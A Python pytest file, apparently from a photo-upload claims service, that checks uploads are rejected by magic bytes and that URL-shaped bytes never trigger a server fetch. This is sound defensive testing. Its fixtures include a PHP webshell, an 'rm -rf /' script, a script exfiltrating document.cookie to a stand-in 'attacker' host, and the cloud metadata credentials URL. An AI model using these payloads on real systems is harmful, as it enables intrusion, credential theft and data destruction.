"""PEN-TEST — SSRF / upload validation.

Two properties:

  1. **No SSRF surface.** The ingest path accepts photo *bytes*, never a URL the
     server fetches. Bytes that happen to *look* like an internal-metadata URL
     (``http://169.254.169.254/...``) are treated as literal, opaque content —
     hashed and stored verbatim — with no outbound request. The illustration
     provider only ever fetches provider-minted asset URLs (its own hosted
     output), never user-influenced input; asserted here as defence-in-depth
     parity.
  2. **Upload validation (magic-byte).** A payload disguised as a photo but whose
     magic bytes identify an executable or active markup is rejected at ingest,
     on both upload routes.
"""
from __future__ import annotations

import json

import pytest

from claimscene.ingest import UploadError, reject_dangerous_bytes

from .conftest import PNG_1x1

# Content that must never be accepted as a photo.
_DANGEROUS = [
    b"MZ\x90\x00\x03",                            # Windows PE
    b"\x7fELF\x02\x01\x01",                       # ELF binary
    b"\xfe\xed\xfa\xcf\x00\x00",                  # Mach-O 64-bit
    b"#!/bin/sh\nrm -rf /",                       # shell script
    b"<?php system($_GET['c']); ?>",             # PHP webshell
    b"<script>alert(document.cookie)</script>",  # active markup
    b"   <!DOCTYPE html><html></html>",          # HTML with leading whitespace
]

# Opaque/benign content that must still be accepted (no false positives).
_BENIGN = [PNG_1x1, b"pixels-0", b"arbitrary opaque photo bytes \x00\x01\x02"]


@pytest.mark.parametrize("payload", _DANGEROUS)
def test_reject_dangerous_bytes_blocks_disguised_payloads(payload):
    with pytest.raises(UploadError):
        reject_dangerous_bytes(payload)


@pytest.mark.parametrize("payload", _BENIGN)
def test_reject_dangerous_bytes_allows_opaque_photo_bytes(payload):
    reject_dangerous_bytes(payload)  # must not raise


def test_api_extract_rejects_disguised_executable_4xx(client):
    r = client.post("/cases/extract",
                    files=[("files", ("holiday.png", b"MZ\x90\x00 evil", "image/png"))])
    assert r.status_code == 400


def test_api_extract_rejects_disguised_html_4xx(client):
    payload = b"<script>fetch('http://attacker/'+document.cookie)</script>"
    r = client.post("/cases/extract",
                    files=[("files", ("pic.png", payload, "image/png"))])
    assert r.status_code == 400


def test_api_render_rejects_disguised_executable_4xx(client):
    scene = client.post("/cases/extract",
                        data={"scenario_id": "s01_rear_end"}).json()["scene"]
    r = client.post("/cases/render",
                    data={"scene": json.dumps(scene)},
                    files=[("files", ("evil.png", b"\x7fELF\x02 evil", "image/png"))])
    assert r.status_code == 400


_SSRF_BYTES = b"http://169.254.169.254/latest/meta-data/iam/security-credentials/"


def test_url_shaped_bytes_are_stored_as_literal_content():
    """The core SSRF assertion at the ingest layer: photo bytes that ARE an
    internal-metadata URL are kept as literal, unmodified content — the server
    never treats a photo as a URL to dereference."""
    from claimscene.adapters import (
        FakeMediaProvider,
        FakeVisionExtractor,
        InMemoryStorage,
    )
    from claimscene.case import CasePhoto, CaseSpec, PhotoSource
    from claimscene.pipeline import CasePipeline
    from claimscene.provenance import sha256_bytes
    from claimscene.schematic import PillowSchematicRenderer

    # URL-shaped bytes are opaque photo content — not markup, not an executable.
    reject_dangerous_bytes(_SSRF_BYTES)  # must not raise
    storage = InMemoryStorage(bucket="ssrf")
    CasePipeline(FakeVisionExtractor(), FakeMediaProvider(), storage,
                 renderer=PillowSchematicRenderer(animate=False)).run(
        CaseSpec(case_id="ssrf", photos=[CasePhoto(
            filename="p.png", data=_SSRF_BYTES, source=PhotoSource.staged_demo)]))
    digest = sha256_bytes(_SSRF_BYTES)
    stored = [storage.get(r["key"]) for r in storage.index if digest in r["key"]]
    assert stored and stored[0] == _SSRF_BYTES  # byte-for-byte, not fetched


def test_ingest_performs_no_outbound_http_fetch(client, monkeypatch):
    """Guard: uploading URL-shaped bytes must not trigger any outbound HTTP fetch.
    We boom the HTTP fetch primitives a URL-dereference would use (never touched
    by the in-process TestClient / asyncio internals), so a real SSRF fetch fails
    the test while the event loop stays intact."""
    import urllib.request

    def _boom(*_a, **_k):
        raise AssertionError("ingest attempted an outbound HTTP fetch (SSRF)")

    monkeypatch.setattr(urllib.request, "urlopen", _boom)
    try:  # requests is an optional dependency
        import requests
        monkeypatch.setattr(requests, "request", _boom)
    except ImportError:
        pass

    r = client.post("/cases/extract",
                    files=[("files", ("p.png", _SSRF_BYTES, "image/png"))])
    assert r.status_code == 200  # accepted + a scene proposed, no fetch
    assert r.json()["inputs"][0]["sha256"]


def test_upload_contract_carries_bytes_not_a_server_fetched_url():
    """Structural: the case input model carries raw ``data`` bytes, not a URL the
    server would dereference — so there is no SSRF-by-design vector."""
    from claimscene.case import CasePhoto

    fields = set(CasePhoto.model_fields)
    assert "data" in fields
    assert not any("url" in f.lower() for f in fields)
